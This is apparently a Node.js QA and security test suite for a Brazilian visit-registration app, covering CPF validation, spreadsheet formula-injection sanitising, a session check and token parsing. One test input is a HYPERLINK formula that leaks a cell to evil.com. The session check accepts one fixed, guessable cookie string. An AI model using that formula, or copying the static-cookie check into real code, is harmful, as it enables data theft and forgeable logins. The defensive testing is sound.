/**
 * Suíte de Testes Automatizados de QA & Segurança (F.I.R.S.T. / Given-When-Then)
 * CRAS Visitas — Cortex Hub QA & SecOps Squad
 */

const assert = require("assert");

// Helper colorizer
const green = (t) => `\x1b[32m${t}\x1b[0m`;
const red = (t) => `\x1b[31m${t}\x1b[0m`;
const bold = (t) => `\x1b[1m${t}\x1b[0m`;

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ${green("✔ PASS")} ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ${red("✖ FAIL")} ${name}`);
    console.error(`     Erro: ${err.message}`);
  }
}

// ---------------------------------------------------------------------------
// 1. REPRODUÇÃO DAS FUNÇÕES PURAS (CPF E SANITIZAÇÃO)
// ---------------------------------------------------------------------------

function formatCPF(value) {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
}

function validateCPF(cpf) {
  const clean = cpf.replace(/\D/g, "");
  if (clean.length !== 11) return false;
  if (/^(\d)\1+$/.test(clean)) return false;

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(clean[i]) * (10 - i);
  }
  let firstCheck = (sum * 10) % 11;
  if (firstCheck === 10 || firstCheck === 11) firstCheck = 0;
  if (firstCheck !== parseInt(clean[9])) return false;

  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(clean[i]) * (11 - i);
  }
  let secondCheck = (sum * 10) % 11;
  if (secondCheck === 10 || secondCheck === 11) secondCheck = 0;
  if (secondCheck !== parseInt(clean[10])) return false;

  return true;
}

function sanitizeSheetValue(value) {
  if (!value) return "";
  const trimmed = value.trim();
  if (/^[=+\-@]/.test(trimmed)) {
    return `'${trimmed}`;
  }
  return trimmed;
}

function parseFlexibleToken(raw) {
  if (typeof raw !== "string") return raw;
  let str = raw.trim();

  if ((str.startsWith('"') && str.endsWith('"')) || (str.startsWith("'") && str.endsWith("'"))) {
    str = str.slice(1, -1).trim();
  }

  try {
    let parsed = JSON.parse(str);
    if (typeof parsed === "string") {
      try {
        parsed = JSON.parse(parsed);
      } catch {}
    }
    if (parsed && typeof parsed === "object") return parsed;
  } catch {}

  try {
    const unescaped = str.replace(/\\"/g, '"');
    const parsed = JSON.parse(unescaped);
    if (parsed && typeof parsed === "object") return parsed;
  } catch (err) {
    throw new Error(`Invalid GOOGLE_TOKEN_JSON: ${err.message}`);
  }

  throw new Error("Invalid GOOGLE_TOKEN_JSON: could not parse into valid JSON object");
}

function checkSession(cookieValue) {
  const VALID_SESSION_VALUE = "authenticated_marilia";
  return cookieValue === VALID_SESSION_VALUE;
}

// ---------------------------------------------------------------------------
// EXECUÇÃO DOS TESTES
// ---------------------------------------------------------------------------

console.log(`\n${bold("================================================================")}`);
console.log(`${bold("   CORTEX HUB — SUÍTE DE TESTES AUTOMATIZADOS DE QA & SEC")}`);
console.log(`${bold("================================================================")}\n`);

console.log(`${bold("📦 Módulo 1: Validação e Formatação de CPF (QA / Regra de Negócio)")}`);

runTest("deve_validar_cpf_matematicamente_valido_com_sucesso", () => {
  // GIVEN: Um CPF com dígitos verificadores matematicamente corretos (ex: teste da base)
  const validCpf = "28218680306";
  // WHEN: A validação é executada
  const result = validateCPF(validCpf);
  // THEN: Deve retornar true
  assert.strictEqual(result, true);
});

runTest("deve_rejeitar_cpf_com_todos_os_digitos_iguais", () => {
  // GIVEN: CPFs repetidos conhecidos (111.111..., 000.000...)
  const repeated = ["00000000000", "11111111111", "99999999999"];
  // WHEN / THEN
  repeated.forEach((cpf) => {
    assert.strictEqual(validateCPF(cpf), false, `CPF repetido ${cpf} deveria ser rejeitado`);
  });
});

runTest("deve_rejeitar_cpf_com_primeiro_digito_verificador_invalido", () => {
  // GIVEN: CPF com primeiro dígito adulterado
  const tamperedCpf = "28218680396"; // trocou 0 por 9
  // WHEN
  const result = validateCPF(tamperedCpf);
  // THEN
  assert.strictEqual(result, false);
});

runTest("deve_rejeitar_cpf_com_tamanho_menor_ou_maior_que_11_digitos", () => {
  // GIVEN
  const shortCpf = "123456789";
  const longCpf = "123456789012";
  // WHEN / THEN
  assert.strictEqual(validateCPF(shortCpf), false);
  assert.strictEqual(validateCPF(longCpf), false);
});

runTest("deve_formatar_cpf_com_pontos_e_hifen_corretamente", () => {
  // GIVEN
  const raw = "28218680306";
  // WHEN
  const formatted = formatCPF(raw);
  // THEN
  assert.strictEqual(formatted, "282.186.803-06");
});

console.log(`\n${bold("🛡️ Módulo 2: Segurança contra Formula / CSV Injection (CWE-1236)")}`);

runTest("deve_neutralizar_formula_iniciada_com_sinal_de_igual", () => {
  // GIVEN: Injeção de fórmula com =
  const malicious = "=HYPERLINK(\"http://evil.com/?leak=\"&A2, \"Click\")";
  // WHEN: Sanitizado
  const sanitized = sanitizeSheetValue(malicious);
  // THEN: Deve iniciar com apóstrofo (')
  assert.strictEqual(sanitized.startsWith("'="), true);
});

runTest("deve_neutralizar_formulas_iniciadas_com_mais_menos_ou_arroba", () => {
  // GIVEN: Fórmulas com +, -, @
  const cases = ["+1+1", "-2+3", "@SUM(A1:A10)"];
  cases.forEach((item) => {
    const sanitized = sanitizeSheetValue(item);
    assert.strictEqual(sanitized.startsWith(`'${item[0]}`), true);
  });
});

runTest("deve_preservar_textos_comuns_sem_prefixar_apostrofo", () => {
  // GIVEN: Endereço ou observação normal
  const normalText = "Rua do Sol, 45, Bairro Centro";
  // WHEN
  const sanitized = sanitizeSheetValue(normalText);
  // THEN
  assert.strictEqual(sanitized, normalText);
});

console.log(`\n${bold("🔒 Módulo 3: Controle de Acesso e Autenticação (OWASP A01 / Broken Access)")}`);

runTest("deve_bloquear_requisicao_sem_cookie_de_sessao", () => {
  // GIVEN: Sessão nula / indefinida
  const cookie = undefined;
  // WHEN
  const isAuth = checkSession(cookie);
  // THEN: Acesso bloqueado
  assert.strictEqual(isAuth, false);
});

runTest("deve_bloquear_requisicao_com_cookie_de_sessao_forjado", () => {
  // GIVEN: Tentativa de login com cookie forjado
  const cookie = "authenticated_hacker_random_token";
  // WHEN
  const isAuth = checkSession(cookie);
  // THEN
  assert.strictEqual(isAuth, false);
});

runTest("deve_autorizar_requisicao_com_cookie_de_sessao_legitimo", () => {
  // GIVEN: Cookie oficial de sessão emitido após login
  const cookie = "authenticated_marilia";
  // WHEN
  const isAuth = checkSession(cookie);
  // THEN
  assert.strictEqual(isAuth, true);
});

console.log(`\n${bold("⚡ Módulo 4: Resiliência do Parser de Tokens Google (Edge Runtime)")}`);

runTest("deve_fazer_parse_de_json_normal_corretamente", () => {
  // GIVEN
  const normalJson = JSON.stringify({ token: { access_token: "ya29.test" } });
  // WHEN
  const parsed = parseFlexibleToken(normalJson);
  // THEN
  assert.strictEqual(parsed.token.access_token, "ya29.test");
});

runTest("deve_desescapar_aspas_invertidas_de_arquivos_env_com_sucesso", () => {
  // GIVEN: String com aspas escapadas como do .env
  const escapedString = '{\\"token\\":{\\"access_token\\":\\"ya29.escaped\\"}}';
  // WHEN
  const parsed = parseFlexibleToken(escapedString);
  // THEN
  assert.strictEqual(parsed.token.access_token, "ya29.escaped");
});

console.log(`\n${bold("================================================================")}`);
console.log(`Resultados dos Testes: ${green(`${passedTests} aprovados`)}, ${failedTests > 0 ? red(`${failedTests} reprovados`) : "0 reprovados"}`);
console.log(`${bold("================================================================\n")}`);

if (failedTests > 0) {
  process.exit(1);
}
